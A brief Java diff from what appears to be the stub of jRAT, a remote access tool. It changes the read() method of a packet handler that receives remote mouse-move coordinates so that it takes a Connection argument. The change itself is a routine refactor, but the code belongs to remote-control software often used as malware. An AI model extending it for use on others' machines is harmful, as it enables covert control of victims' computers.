@@ -6,7 +6,7 @@ import se.jrat.stub.utils.ScreenUtils;
 public class Packet91MouseMove extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		int x = Connection.instance.readInt();
 		int y = Connection.instance.readInt();
 		int monitor = Connection.instance.readInt();
